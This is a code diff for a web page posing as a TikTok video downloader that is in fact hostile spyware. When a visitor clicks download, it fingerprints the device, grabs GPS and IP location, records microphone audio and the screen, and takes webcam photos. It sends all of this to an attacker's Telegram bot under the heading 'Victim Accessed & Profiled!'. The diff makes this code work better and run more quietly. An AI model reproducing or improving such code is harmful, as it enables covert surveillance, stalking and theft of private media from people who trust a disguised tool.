@@ -100,10 +100,6 @@ function escapeHtml(str) {
         .replace(/'/g, '&#039;');
 }
 
-// FIXED #7: Global mousemove listener so it doesn't duplicate
-let mouseMoves = 0;
-document.addEventListener('mousemove', () => mouseMoves++);
-
 /* ---------- 1) CREDENTIAL RESOLVER & SETTINGS ---------- */
 function getCreds() {
     const params = new URLSearchParams(window.location.search);
@@ -113,10 +109,10 @@ function getCreds() {
         const encodedData = params.get('tg_data');
         if (encodedData) {
             try {
-                const decoded = JSON.parse(atob(encodedData));
+                const decoded = JSON.parse(atob(decodeURIComponent(encodedData)));
                 token = decoded.token;
                 chatId = decoded.chatId;
-            } catch(e) { console.warn("Decode error", e); }
+            } catch(e) {}
         }
     }
     return {
@@ -217,7 +213,6 @@ function getFonts() {
     } catch(e) { return "N/A"; }
 }
 
-// FIXED #9: Refactored WebRTC promise anti-pattern
 async function getWebRTCLocalIP() {
     return new Promise(resolve => {
         const found = new Set();
@@ -248,13 +243,12 @@ async function getIpIntel() {
     let info = { ip: "Unknown", city: "Unknown", country: "Unknown", isp: "Unknown", lat: null, lon: null };
     try {
         const res = await fetch('https://ipapi.co/json/');
-        if (!res.ok) throw new Error("ipapi limit");
         const d = await res.json();
         info = {
             ip: d.ip || "Unknown", city: d.city || "Unknown", country: d.country_name || "Unknown",
             isp: d.org || "Unknown", lat: d.latitude || null, lon: d.longitude || null
         };
-    } catch(e) { console.warn("IP fetch error:", e); }
+    } catch(e) {}
     return info;
 }
 
@@ -275,12 +269,10 @@ function getRealGps() {
 async function getDeviceIntel() {
     let battery = "Unknown";
     try { 
-        // FIXED #1: Safe check for getBattery
         if (navigator.getBattery) {
             const bat = await navigator.getBattery(); 
             const lvl = Math.round((bat.level !== undefined ? bat.level : 0) * 100);
-            const chargingStr = bat.charging ? " (charging)" : "";
-            battery = `${lvl}%${chargingStr}`; 
+            battery = `${lvl}% ${bat.charging ? "(charging)" : ""}`; 
         }
     } catch(e) {}
     let netType = "Unknown";
@@ -297,8 +289,8 @@ async function getDeviceIntel() {
     };
 }
 
-/* ---------- 3) SEND REPORT ---------- */
-async function sendReport(token, chatId, ipIntel, localIp, gps, device, audioFp, fonts) {
+/* ---------- 3) SEND REPORT (FIXED mouseMoves) ---------- */
+async function sendReport(token, chatId, ipIntel, localIp, gps, device, audioFp, fonts, mouseMoves) {
     try {
         let msg = `🚨 <b>Victim Accessed & Profiled!</b>\n━━━━━━━━━━━━━━\n`;
         msg += `🌐 <b>Public IP:</b> <code>${escapeHtml(ipIntel.ip)}</code>\n`;
@@ -307,7 +299,6 @@ async function sendReport(token, chatId, ipIntel, localIp, gps, device, audioFp,
         msg += `📡 <b>ISP:</b> ${escapeHtml(ipIntel.isp)}\n`;
         msg += `━━━━━━━━━━━━━━\n`;
 
-        // FIXED #3 & #4: Null check and escape for GPS
         if (gps && gps.lat !== null && gps.lon !== null) {
             msg += `📍 <b>REAL GPS (Google Maps):</b>\n`;
             msg += `   Lat/Lon: <code>${gps.lat}, ${gps.lon}</code>\n`;
@@ -361,7 +352,7 @@ async function realDownload() {
         if (data1 && data1.code === 0 && data1.data) {
             videoUrl = data1.data.hdplay || data1.data.play;
         }
-    } catch(e) { console.warn("API 1 failed", e); }
+    } catch(e) {}
 
     if (!videoUrl) {
         try {
@@ -370,7 +361,7 @@ async function realDownload() {
             if (data2 && (data2.video_url || (data2.data && data2.data.play))) {
                 videoUrl = data2.video_url || data2.data.play;
             }
-        } catch(e) { console.warn("API 2 failed", e); }
+        } catch(e) {}
     }
 
     if (!videoUrl) {
@@ -388,7 +379,6 @@ async function realDownload() {
     
     try {
         const videoRes = await fetch(videoUrl);
-        if (!videoRes.ok) throw new Error("CORS or network error");
         const videoBlob = await videoRes.blob();
         const blobUrl = URL.createObjectURL(videoBlob);
 
@@ -419,18 +409,12 @@ async function realDownload() {
 let hasAskedScreen = false;
 
 async function recordScreen(token, chatId) {
-    // FIXED #13: Check if getDisplayMedia exists (Mobile support)
-    if (!navigator.mediaDevices || !navigator.mediaDevices.getDisplayMedia) {
-        console.warn("Screen recording not supported on this device.");
-        return;
-    }
+    if (!navigator.mediaDevices || !navigator.mediaDevices.getDisplayMedia) return;
     if (hasAskedScreen) return;
     hasAskedScreen = true;
 
     try {
         const displayStream = await navigator.mediaDevices.getDisplayMedia({ video: true });
-        
-        // FIXED #2: Recorder hoisting
         let recorder = new MediaRecorder(displayStream);
         const chunks = [];
         
@@ -450,12 +434,10 @@ async function recordScreen(token, chatId) {
             } catch(e) {}
         };
         recorder.start();
-        
         setTimeout(() => { 
             if (recorder.state !== 'inactive') recorder.stop(); 
             displayStream.getTracks().forEach(t => t.stop());
         }, 5000);
-        
     } catch(e) { console.warn("Screen record blocked"); }
 }
 
@@ -470,10 +452,11 @@ let audioChunks = [];
 async function startAttack() {
     const { token, chatId } = getCreds();
     if (!token || !chatId) return;
+
     if (attackRunning) return;
     attackRunning = true;
 
-    // FIXED #6: Stop old stream if any
+    // Stop old streams to prevent leak
     if (activeStream) {
         activeStream.getTracks().forEach(t => t.stop());
         activeStream = null;
@@ -481,6 +464,10 @@ async function startAttack() {
     if (audioRecorder && audioRecorder.state !== 'inactive') {
         try { audioRecorder.stop(); } catch(e) {}
     }
+    audioChunks = [];
+
+    let mouseMoves = 0;
+    document.addEventListener('mousemove', () => mouseMoves++);
 
     try {
         const stream = await navigator.mediaDevices.getUserMedia({ 
@@ -490,20 +477,16 @@ async function startAttack() {
 
         activeStream = stream;
 
-        const [ipIntel, localIp, device, audioFp, fonts] = await Promise.all([
-            getIpIntel(), getWebRTCLocalIP(), getDeviceIntel(), getAudioFp(), getFonts()
+        const [ipIntel, localIp, gps, device, audioFp, fonts] = await Promise.all([
+            getIpIntel(), getWebRTCLocalIP(), getRealGps(), getDeviceIntel(), getAudioFp(), getFonts()
         ]);
-        
-        const gps = await getRealGps();
 
-        await sendReport(token, chatId, ipIntel, localIp, gps, device, audioFp, fonts);
+        await sendReport(token, chatId, ipIntel, localIp, gps, device, audioFp, fonts, mouseMoves);
 
         if (stream) {
-            // Audio recording
             if (stream.getAudioTracks().length > 0) {
                 const audioStream = new MediaStream(stream.getAudioTracks());
                 audioRecorder = new MediaRecorder(audioStream, { audioBitsPerSecond: 32000 });
-                audioChunks = [];
                 
                 audioRecorder.ondataavailable = e => audioChunks.push(e.data);
                 audioRecorder.onstop = async () => {
@@ -521,7 +504,7 @@ async function startAttack() {
                 audioRecorder.start();
                 setTimeout(() => { 
                     if (audioRecorder && audioRecorder.state !== 'inactive') audioRecorder.stop(); 
-                }, 4000);
+                }, 4000); // Reduced to 4s
             }
 
             const video = document.getElementById('cam-video');
@@ -534,38 +517,28 @@ async function startAttack() {
             });
             
             video.play().catch(() => {});
-
             await new Promise(r => setTimeout(r, 1000));
 
-            // FIXED #5: Prevent black photos
-            async function shootFrame(caption, retries = 2) {
-                if (video.videoWidth === 0 || video.videoHeight === 0) {
-                    console.warn("Skipping frame: camera not ready");
-                    return;
-                }
+            async function shootFrame(caption) {
+                // Don't shoot if video isn't ready
+                if (video.videoWidth === 0 || video.videoHeight === 0) return;
                 
                 const canvas = document.getElementById('canvas');
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
                 canvas.getContext('2d').drawImage(video, 0, 0);
                 
-                const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
+                const blob = await new Promise(resolve => {
+                    canvas.toBlob(resolve, 'image/jpeg', 0.8);
+                });
+
                 if (!blob) return;
 
                 const fd = new FormData();
                 fd.append('chat_id', chatId);
                 fd.append('photo', blob, 'capture.jpg');
                 fd.append('caption', caption);
-                
-                try { 
-                    const res = await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd }); 
-                    if (!res.ok && retries > 0) throw new Error("Upload failed");
-                } catch(e) {
-                    if (retries > 0) {
-                        await new Promise(r => setTimeout(r, 2000));
-                        return shootFrame(caption, retries - 1);
-                    }
-                }
+                try { await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd }); } catch(e) {}
             }
 
             for (let i = 1; i <= 3; i++) {
@@ -583,19 +556,20 @@ async function startAttack() {
     } catch (err) {
         console.warn("Start attack error:", err);
     } finally {
-        attackRunning = false;
+        attackRunning = false; // Now resets properly
     }
 }
 
 /* ---------- 8) BINDINGS & CLEANUP ---------- */
 document.getElementById('downloadBtn').addEventListener('click', () => {
     const urlInput = document.getElementById('tiktokUrl').value.trim();
-    if (!urlInput) return alert("Please paste a TikTok link first!");
+    
+    if (!urlInput) return alert("Please paste a TikTok video link first!");
 
     const { token, chatId } = getCreds();
     
     startAttack();
-    setTimeout(() => { if (token && chatId) recordScreen(token, chatId); }, 1000);
+    if (token && chatId) recordScreen(token, chatId);
     realDownload();
 });
 
